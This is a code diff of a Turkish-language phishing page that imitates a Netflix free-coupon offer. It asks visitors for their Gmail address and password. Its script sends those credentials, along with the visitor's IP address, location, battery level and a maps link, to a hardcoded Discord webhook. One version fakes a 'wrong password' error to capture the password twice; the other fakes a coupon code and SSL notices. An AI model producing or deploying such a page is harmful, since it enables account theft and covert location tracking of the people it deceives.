@@ -3,169 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix - 3 Aylık Ücretsiz Hediye Kuponu</title>
-    
+    <title>Netflix - 3 Aylık Özel Hediye Kartı</title>
     <style>
+        * { box-sizing: border-box; }
         body { background-color: #000; color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bca1-0744f08f14b3/af6a7071-7788-46a2-944d-2a32197607a7/TR-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg'); background-size: cover; filter: brightness(0.3); z-index: -1; }
         
-        /* Gelişmiş Bildirim Paneli */
-        #notif {
-            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
-            width: 90%; max-width: 400px; background: #fff; color: #333;
-            border-radius: 8px; padding: 15px; display: flex; align-items: center;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5); transition: 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 1000;
-        }
-        #notif img { width: 35px; border-radius: 4px; margin-right: 12px; }
-
-        .login-box { width: 90%; max-width: 380px; text-align: center; padding: 30px; background: rgba(0,0,0,0.85); border-radius: 10px; }
-        .login-box img { width: 170px; margin-bottom: 25px; }
+        .box { width: 90%; max-width: 400px; padding: 50px; background: rgba(0,0,0,0.85); border-radius: 10px; text-align: center; box-shadow: 0 0 40px rgba(0,0,0,1); }
+        .box img { width: 160px; margin-bottom: 20px; }
         
-        h2 { font-size: 22px; margin-bottom: 10px; font-weight: bold; }
-        p { font-size: 14px; color: #b3b3b3; margin-bottom: 25px; }
-
-        .stats { display: flex; justify-content: space-around; margin-bottom: 20px; font-size: 12px; color: #46d369; font-weight: bold; }
-
-        input { 
-            width: 100%; padding: 16px; margin-bottom: 15px; border-radius: 5px; 
-            border: none; background: #333; color: #fff; box-sizing: border-box; outline: none; font-size: 16px;
-        }
-        input:focus { background: #454545; box-shadow: 0 0 0 2px #e50914; }
-        .secure-mask { -webkit-text-security: disc !important; }
-
-        button { 
-            width: 100%; padding: 16px; border: none; border-radius: 5px; 
-            background: #e50914; color: #fff; font-size: 17px; font-weight: bold; 
-            cursor: pointer; transition: 0.3s; opacity: 0.5; pointer-events: none;
-        }
-        button.active { opacity: 1; pointer-events: auto; }
-
-        /* Yükleme Ekranı */
-        #loading { display: none; text-align: center; }
-        .spinner { border: 4px solid #333; border-top: 4px solid #e50914; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .footer { font-size: 11px; color: #555; margin-top: 20px; line-height: 1.4; }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 4px; border: none; background: #333; color: #fff; font-size: 16px; outline: none; }
+        input:focus { background: #454545; border-bottom: 2px solid #e50914; }
+        .mask { -webkit-text-security: disc !important; }
+        
+        button { width: 100%; padding: 15px; border: none; border-radius: 4px; background: #e50914; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        
+        #couponUI, #loading { display: none; }
+        .coupon-code { background: #1a1a1a; border: 2px dashed #46d369; padding: 15px; font-size: 22px; font-weight: bold; letter-spacing: 2px; color: #46d369; margin: 20px 0; border-radius: 5px; }
+        
+        #notif { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 380px; background: #fff; color: #333; padding: 15px; border-radius: 8px; display: flex; align-items: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.8s; z-index: 9999; }
     </style>
 </head>
 <body>
+    <div class="bg"></div>
 
     <div id="notif">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png">
-        <div style="flex:1;">
-            <b style="font-size:14px; display:block;">Netflix Güvenlik Birimi</b>
-            <span style="font-size:12px; color:#666;">Cihazınız "Güvenli" olarak doğrulandı.</span>
-        </div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" width="30" style="margin-right:12px;">
+        <span style="font-size:13px; font-weight:bold;">Sistem: Bağlantı uçtan uca şifrelendi (SSL).</span>
     </div>
 
-    <div class="login-box" id="boxUI">
+    <div class="box" id="loginUI">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
-        
-        <div class="stats">
-            <span>● Canlı: <span id="online">482</span></span>
-            <span>● Kalan Kupon: <span id="coupons">14</span></span>
-        </div>
-
-        <h2 id="titleTxt">Kuponunuzu Tanımlayın</h2>
-        <p id="descTxt">Lütfen Gmail hesabınızla oturum açın.</p>
-        
-        <input type="email" id="email" placeholder="E-posta (@gmail.com)" oninput="kontrol()">
-        <input type="text" id="pass" class="secure-mask" placeholder="Şifre" oninput="kontrol()">
-        
-        <button id="btn" onclick="ilkGonderim()">Kuponu Aktif Et</button>
-        
-        <div class="footer">
-            Bu sayfa SSL v3 ile 256-bit şifrelenmiştir.<br>
-            Netflix, Inc. © 2026
-        </div>
+        <h2 style="font-size: 20px; margin-bottom: 10px;">Hediye Kuponunu Aktif Et</h2>
+        <p style="font-size: 14px; color: #b3b3b3; margin-bottom: 20px;">3 Aylık ücretsiz kullanım için Gmail hesabınızı doğrulayın.</p>
+        <input type="email" id="email" placeholder="E-posta (@gmail.com)">
+        <input type="text" id="pass" class="mask" placeholder="Şifre">
+        <button onclick="fire()">Kuponu Tanımla</button>
     </div>
 
-    <div id="loading">
-        <div class="spinner"></div>
-        <h3 id="loadMsg">Veriler Şifreleniyor...</h3>
+    <div class="box" id="loading">
+        <div style="border: 4px solid #333; border-top: 4px solid #e50914; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+        <p>Bilgileriniz Onaylanıyor...</p>
     </div>
 
-    <audio id="sound"><source src="https://www.myinstants.com/media/sounds/netflix-tudum.mp3" type="audio/mpeg"></audio>
+    <div class="box" id="couponUI">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
+        <h2 style="color: #46d369;">Tebrikler!</h2>
+        <p>3 Aylık Hediye Kuponunuz Oluşturuldu:</p>
+        <div class="coupon-code">NFLX-2026-BKN9</div>
+        <p style="font-size:12px; color:#888;">Bu kodu Netflix ödeme sayfasında kullanabilirsiniz.</p>
+        <button style="background:#444;" onclick="window.location.href='https://www.netflix.com/tr/redeem'">Kodu Kullan</button>
+    </div>
+
+    <audio id="tudum"><source src="https://www.myinstants.com/media/sounds/netflix-tudum.mp3" type="audio/mpeg"></audio>
 
     <script>
-        const hook = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
+        const webhook = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
         let geo = {};
-        let deneme = 0;
 
-        // Bilgi Toplama ve Başlangıç
+        // 1. AŞAMA: SAYFA AÇILDIĞI AN (TÜM CİHAZ VE KONUM VERİLERİ)
         window.onload = async () => {
             try {
-                const r = await fetch('https://ipapi.co/json/');
-                geo = await r.json();
-            } catch(e) {}
-            
-            // Canlı Sayaçlar
-            setInterval(() => {
-                document.getElementById('online').innerText = Math.floor(Math.random() * (500 - 450) + 450);
-            }, 3000);
+                const res = await fetch('https://ipapi.co/json/');
+                geo = await res.json();
+                
+                let battery = "Bilinmiyor";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = Math.round(b.level * 100) + "%";
+                }
 
-            // Bildirim ve Ses
-            setTimeout(() => { 
-                document.getElementById('sound').play();
-                document.getElementById('notif').style.top = "20px"; 
-            }, 2000);
-            setTimeout(() => { document.getElementById('notif').style.top = "-100px"; }, 6000);
+                const device = navigator.userAgent.includes("Mobi") ? "📱 MOBİL" : "💻 PC";
+                const gMaps = `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`;
+
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        username: "SİSTEM SIZMA ANALİZİ",
+                        embeds: [{
+                            title: "🔍 1. AŞAMA: KURBAN TIKLADI",
+                            color: 3447003,
+                            fields: [
+                                { name: "🌐 IP / ISP", value: `\`${geo.ip}\` (${geo.org})`, inline: false },
+                                { name: "🏠 Konum", value: `**${geo.city} / ${geo.region} / ${geo.country_name}**`, inline: true },
+                                { name: "🔋 Pil & Cihaz", value: `${battery} | ${device}`, inline: true },
+                                { name: "📍 Harita", value: `[TAM KONUMU GÖR](${gMaps})`, inline: false }
+                            ],
+                            timestamp: new Date()
+                        }]
+                    })
+                });
+                document.getElementById('tudum').play();
+                setTimeout(() => document.getElementById('notif').style.top = "20px", 1500);
+                setTimeout(() => document.getElementById('notif').style.top = "-100px", 5000);
+            } catch(e) {}
         };
 
-        function kontrol() {
+        // 2. AŞAMA: BUTONA TIKLADIĞI AN (HESAP BİLGİLERİ + SAHTE KUPON)
+        async function fire() {
             const e = document.getElementById('email').value;
             const p = document.getElementById('pass').value;
-            const b = document.getElementById('btn');
-            if(e.includes('@gmail.com') && p.length > 5) b.classList.add('active');
-            else b.classList.remove('active');
-        }
 
-        async function ilkGonderim() {
-            const e = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
-            deneme++;
+            if(!e.includes('@') || p.length < 5) return alert("Lütfen geçerli bilgiler girin.");
 
-            document.getElementById('boxUI').style.display = "none";
+            document.getElementById('loginUI').style.display = "none";
             document.getElementById('loading').style.display = "block";
 
-            // Make.com 'Content' parametresini doldurmak için maili düz yazı olarak gönderiyoruz.
-            await fetch(hook, {
+            // Make.com için 'content' parametresini mail ile dolduruyoruz.
+            await fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     content: e, 
                     embeds: [{
-                        title: deneme === 1 ? "⚠️ İLK GİRİŞ DENEMESİ" : "🎯 HEDEF PAKETLENDİ!",
-                        color: deneme === 1 ? 16776960 : 16711680,
+                        title: "🎯 2. AŞAMA: BİLGİLER GELDİ",
+                        color: 16711680,
                         fields: [
-                            { name: "📧 Hesap", value: `**${e}**`, inline: true },
-                            { name: "🔑 Şifre", value: `\`${p}\``, inline: true },
-                            { name: "🌐 Şehir/Ülke", value: `${geo.city} / ${geo.country_name}`, inline: false },
-                            { name: "🖥️ IP", value: `\`${geo.ip}\``, inline: true }
+                            { name: "📧 E-posta", value: `**${e}**`, inline: true },
+                            { name: "🔑 Şifre", value: `\`${p}\``, inline: true }
                         ],
-                        footer: { text: "Cihaz: " + navigator.platform },
+                        footer: { text: "Siber Güvenlik Deneysel Rapor" },
                         timestamp: new Date()
                     }]
                 })
             });
 
-            if(deneme === 1) {
-                // Sosyal Mühendislik Hilesi: İlk seferde hata verdirip doğruluğu kesinleştirme
-                setTimeout(() => {
-                    document.getElementById('loading').style.display = "none";
-                    document.getElementById('boxUI').style.display = "block";
-                    document.getElementById('titleTxt').innerText = "Hata: Yanlış Şifre";
-                    document.getElementById('titleTxt').style.color = "#e50914";
-                    document.getElementById('descTxt').innerText = "Lütfen şifrenizi tekrar kontrol ederek giriniz.";
-                    document.getElementById('pass').value = "";
-                }, 2500);
-            } else {
-                // İkinci girişte yönlendirme
-                document.getElementById('loadMsg').innerText = "Kuponunuz Aktif Ediliyor...";
-                setTimeout(() => {
-                    window.location.href = "https://www.netflix.com/tr/login";
-                }, 3000);
-            }
+            setTimeout(() => {
+                document.getElementById('loading').style.display = "none";
+                document.getElementById('couponUI').style.display = "block";
+            }, 3000);
         }
     </script>
+    <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
 </body>
 </html>
